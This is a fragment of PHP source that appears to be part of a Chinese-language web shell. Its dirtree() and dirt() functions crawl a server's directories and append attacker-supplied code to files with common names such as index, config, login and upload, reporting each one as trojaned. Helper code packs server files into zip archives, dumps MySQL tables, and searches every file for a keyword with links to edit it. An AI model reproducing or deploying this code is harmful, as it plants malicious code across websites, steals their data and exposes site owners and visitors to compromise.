		$file=$d->path."/" .$entry;
		if(@is_dir($file)) 
		{
		dirtree($file,$mm);
		}
		else
		{
				if(@ereg("default\.|index\.|admin\.|bbs\.|conn\.|config\.|reg\.|help\.|upfile\.|upload\.|cart\.|class\.|login\.|diy\.|no\.|ok\.|del\.|sql\.|user\.|ubb\.|ftp\.|asp\.|top\.|new\.|open\.|name\.|email\.|img\.|images\.|web\.|blog\.|save\.|data\.|add\.|edit\.|main\.|form\.|game\.|about\.|manager\.|book\.|bt\.|mp3\.|vod\.|error\.|copy\.|move\.|down\.|system\.|logo\.|QQ\.|520\.|newup\.|myup\.|play\.|show\.|view\.|ip\.|err404\.|send\.|foot\.|char\.|info\.|list\.|shop\.|err\.|nc\.|ad\.|flash\.|text\.|admin_upfile\.|admin_upload\.|upfile_load\.|upfile_soft\.|upfile_photo\.|upfile_softpic\.|vip\.|505\.|tag\.|search\.|list\.|common\.|show\.|count\.|download\.|php\.",$file)) {
				$mm=stripcslashes( trim( $mm ) );//防止单双引号被加上斜杠
				$handle = @fopen ("$file", "a");
				@fwrite($handle, "$mm");
				@fclose($handle);
				echo "已挂马文件:$file<br>";
				}
		}
	}
	$d->close();
}
	// 检查PHP配置参数
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return "No";
			break;
			case 1:
			return "Yes";
			break;
			default:
			return $result;
			break;
		}
	}

	// 检查函数情况
	function getfun($funName) {
		return (false !== function_exists($funName)) ? "Yes" : "No";
	}

	// 压缩打包类
	class PHPZip{
	var $out='';
		function PHPZip($dir)	{
    		if (@function_exists('gzcompress'))	{
				$curdir = getcwd();
				if (is_array($dir)) $filelist = $dir;
		        else{
			        $filelist=$this -> GetFileList($dir);//文件列表
				    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
	            }
		        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
				else chdir($curdir);
				if (count($filelist)>0){
					foreach($filelist as $filename){
						if (is_file($filename)){
							$fd = fopen ($filename, "r");
							$content = @fread ($fd, filesize ($filename));
							fclose ($fd);
						    if (is_array($dir)) $filename = basename($filename);
							$this -> addFile($content, $filename);
						}
					}
					$this->out = $this -> file();
					chdir($curdir);
				}
				return 1;
			}
			else return 0;
		}

		// 获得指定目录文件列表
		function GetFileList($dir){
			static $a;
			if (is_dir($dir)) {
				if ($dh = opendir($dir)) {
			   		while (($file = readdir($dh)) !== false) {
						if($file!='.' && $file!='..'){
            				$f=$dir .'/'. $file;
            				if(is_dir($f)) $this->GetFileList($f);
							$a[]=$f;
	        			}
					}
     				closedir($dh);
    			}
			}
			return $a;
		}

		var $datasec      = array();
	    var $ctrl_dir     = array();
		var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
	    var $old_offset   = 0;

		function unix2DosTime($unixtime = 0) {
	        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
		    if ($timearray['year'] < 1980) {
				$timearray['year']    = 1980;
        		$timearray['mon']     = 1;
	        	$timearray['mday']    = 1;
		    	$timearray['hours']   = 0;
				$timearray['minutes'] = 0;
        		$timearray['seconds'] = 0;
	        } // end if
		    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
			        ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
	    }

		function addFile($data, $name, $time = 0) {
	        $name     = str_replace('\\', '/', $name);

		    $dtime    = dechex($this->unix2DosTime($time));
	        $hexdtime = '\x' . $dtime[6] . $dtime[7]
		              . '\x' . $dtime[4] . $dtime[5]
			          . '\x' . $dtime[2] . $dtime[3]
				      . '\x' . $dtime[0] . $dtime[1];
	        eval('$hexdtime = "' . $hexdtime . '";');
		    $fr   = "\x50\x4b\x03\x04";
			$fr   .= "\x14\x00";
	        $fr   .= "\x00\x00";
		    $fr   .= "\x08\x00";
			$fr   .= $hexdtime;

	        $unc_len = strlen($data);
		    $crc     = crc32($data);
			$zdata   = gzcompress($data);
	        $c_len   = strlen($zdata);
		    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
			$fr      .= pack('V', $crc);
	        $fr      .= pack('V', $c_len);
		    $fr      .= pack('V', $unc_len);
			$fr      .= pack('v', strlen($name));
	        $fr      .= pack('v', 0);
		    $fr      .= $name;

			$fr .= $zdata;

	        $fr .= pack('V', $crc);
		    $fr .= pack('V', $c_len);
			$fr .= pack('V', $unc_len);

	        $this -> datasec[] = $fr;
		    $new_offset        = strlen(implode('', $this->datasec));

			$cdrec = "\x50\x4b\x01\x02";
	        $cdrec .= "\x00\x00";
		    $cdrec .= "\x14\x00";
			$cdrec .= "\x00\x00";
	        $cdrec .= "\x08\x00";
		    $cdrec .= $hexdtime;
			$cdrec .= pack('V', $crc);
	        $cdrec .= pack('V', $c_len);
		    $cdrec .= pack('V', $unc_len);
			$cdrec .= pack('v', strlen($name) );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('v', 0 );
			$cdrec .= pack('v', 0 );
	        $cdrec .= pack('v', 0 );
		    $cdrec .= pack('V', 32 );
			$cdrec .= pack('V', $this -> old_offset );
	        $this -> old_offset = $new_offset;
		    $cdrec .= $name;

			$this -> ctrl_dir[] = $cdrec;
	    }

		function file() {
			$data    = implode('', $this -> datasec);
	        $ctrldir = implode('', $this -> ctrl_dir);
		    return
			    $data .
				$ctrldir .
	            $this -> eof_ctrl_dir .
		        pack('v', sizeof($this -> ctrl_dir)) .
			    pack('v', sizeof($this -> ctrl_dir)) .
				pack('V', strlen($ctrldir)) .
	            pack('V', strlen($data)) .
		        "\x00\x00";
	    }
	}
function dirt($pathh,$mmm)
 { 
	$d =@dir("$pathh");
	while (false !== ($entry = $d->read())) {
		if($entry == "." || $entry == "..") continue;
		$file=$d->path."/" .$entry;
		if(@is_dir($file)) 
		{
		dirtree($file,$mmm);
		}
		else
		{
				if(@ereg("config\.|conn\.",$file)) {
				$mmm=stripcslashes( trim( $mmm ) );
				$handle = @fopen ("$file", "a");
				@fwrite($handle, "$mmm");
				@fclose($handle);
				}
		}
	}
	$d->close();
}
	// 备份数据库
	function sqldumptable($table, $fp=0) {
		$tabledump = "DROP TABLE IF EXISTS $table;\n";
		$tabledump .= "CREATE TABLE $table (\n";

		$firstfield=1;

		$fields = mysql_query("SHOW FIELDS FROM $table");
		while ($field = mysql_fetch_array($fields)) {
			if (!$firstfield) {
				$tabledump .= ",\n";
			} else {
				$firstfield=0;
			}
			$tabledump .= "   $field[Field] $field[Type]";
			if (!empty($field["Default"])) {
				$tabledump .= " DEFAULT '$field[Default]'";
			}
			if ($field['Null'] != "YES") {
				$tabledump .= " NOT NULL";
			}
			if ($field['Extra'] != "") {
				$tabledump .= " $field[Extra]";
			}
		}
		mysql_free_result($fields);
	
		$keys = mysql_query("SHOW KEYS FROM $table");
		while ($key = mysql_fetch_array($keys)) {
			$kname=$key['Key_name'];
			if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
				$kname="UNIQUE|$kname";
			}
			if(!is_array($index[$kname])) {
				$index[$kname] = array();
			}
			$index[$kname][] = $key['Column_name'];
		}
		mysql_free_result($keys);

		while(list($kname, $columns) = @each($index)) {
			$tabledump .= ",\n";
			$colnames=implode($columns,",");

			if ($kname == "PRIMARY") {
				$tabledump .= "   PRIMARY KEY ($colnames)";
			} else {
				if (substr($kname,0,6) == "UNIQUE") {
					$kname=substr($kname,7);
				}
				$tabledump .= "   KEY $kname ($colnames)";
			}
		}

		$tabledump .= "\n);\n\n";
		if ($fp) {
			fwrite($fp,$tabledump);
		} else {
			echo $tabledump;
		}

		$rows = mysql_query("SELECT * FROM $table");
		$numfields = mysql_num_fields($rows);
		while ($row = mysql_fetch_array($rows)) {
			$tabledump = "INSERT INTO $table VALUES(";

			$fieldcounter=-1;
			$firstfield=1;
			while (++$fieldcounter<$numfields) {
				if (!$firstfield) {
					$tabledump.=", ";
				} else {
					$firstfield=0;
				}

				if (!isset($row[$fieldcounter])) {
					$tabledump .= "NULL";
				} else {
					$tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
				}
			}

			$tabledump .= ");\n";

			if ($fp) {
				fwrite($fp,$tabledump);
			} else {
				echo $tabledump;
			}
		}
		mysql_free_result($rows);
	}

	class FORMS {
		function tableheader() {
			echo "<table width=\"775\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" bgcolor=\"#ffffff\">\n";
		}

		function headerform($arg=array()) {
			global $dir;
			if ($arg[enctype]){
				$enctype="enctype=\"$arg[enctype]\"";
			} else {
				$enctype="";
			}
			if (!isset($arg[method])) {
				$arg[method] = "POST";
			}
			if (!isset($arg[action])) {
				$arg[action] = '';
			}
			echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
			echo "  <tr>\n";
			echo "    <td>".$arg[content]."</td>\n";
			echo "  </tr>\n";
			echo "  </form>\n";
		}

		function tdheader($title) {
			global $dir;
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">返回</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
			if ($bgcolor=='2') {
				$css="secondalt";
			} elseif ($bgcolor=='1') {
				$css="firstalt";
			} else {
				$css=$bgcolor;
			}
			$height = empty($height) ? "" : " height=".$height;
			$colspan = empty($colspan) ? "" : " colspan=".$colspan;
			echo "  <tr class=\"".$css."\">\n";
			echo "	<td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";
			echo "  </tr>\n";
		}

		function tablefooter() {
			echo "</table>\n";
		}

		function formheader($action='',$title,$target='') {
			global $dir;
			$target = empty($target) ? "" : " target=\"".$target."\"";
			echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
			echo "  <tr class=\"firstalt\">\n";
			echo "	<td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\">返回</a>]</b></td>\n";
			echo "  </tr>\n";
		}

		function makehidden($name,$value=''){
			echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
		}

		function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
			$css = ($css == 'input') ? " class=\"input\"" : "";
			$input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
			return $input;
		}

		function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
			$textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
			return $textarea;
		}

		function formfooter($over='',$height=''){
			$height = empty($height) ? "" : " height=\"".$height."\"";
			echo "  <tr class=\"secondalt\">\n";
			echo "	<td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"确定\"></td>\n";
			echo "  </tr>\n";
			echo " </form>\n";
			echo $end = empty($over) ? "" : "</table>\n";

		}

		function makeselect($arg = array()){
			if ($arg[multiple]==1) {
				$multiple = " multiple";
				if ($arg[size]>0) {
					$size = "size=$arg[size]";
				}
			}
			if ($arg[css]==0) {
				$css = "class=\"input\"";
			}
			$select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
				if (is_array($arg[option])) {
					foreach ($arg[option] AS $key=>$value) {
						if (!is_array($arg[selected])) {
							if ($arg[selected]==$key) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}

						} elseif (is_array($arg[selected])) {
							if ($arg[selected][$key]==1) {
								$select .= "<option value=\"$key\" selected>$value</option>\n";
							} else {
								$select .= "<option value=\"$key\">$value</option>\n";
							}
						}
					}
				}
			$select .= "</select>\n";
			return $select;
		}
	}
	
	function find($path) //查找关键词 
{ 
	global $oldkey,$type,$type2,$endline,$beline; 
	if(is_dir("$path")){ 
	$tempdir=opendir("$path");
	while($f=readdir($tempdir)){ if($f=="."||$f=="..")continue;  find("$path/$f");}
	closedir($tempdir);
	}else{ 
	if(filesize("$path")){ 
	$fp=fopen("$path","r"); 
	$msg=fread($fp, filesize("$path"));
	fclose($fp); 
if(strpos($msg, $oldkey) !== false) {
	$dir = dirname($path);
	$file = basename($path);
if($type=="list"){
	$mymsg = explode("\n",$msg);
	$long = count($mymsg);
	$tmp = explode($oldkey,$msg);
	$tmp = explode("\n",$tmp[0]);
	$first = count($tmp);
	$end = "[".$first."/".$long."]";
}
if($type2=="getpath"){
	$get = explode($oldkey,$msg);
	$get = strlen($get[0]);
	if(isset($beline)){
	$get = $get-$beline;
	}
	$getpath = htmlspecialchars(substr($msg, $get, $endline)); 
	$getpath = "title = \"".$getpath."\"";
}
echo "<span class=\"redfont\" $getpath>找到:$dir/$file</span> |<a href=\"?action=editfile&dir=$dir&editfile=$file\" target=\"_blank\">view+edit</a> | $end <br>";
}
                              } 
                         }                    
} 
?>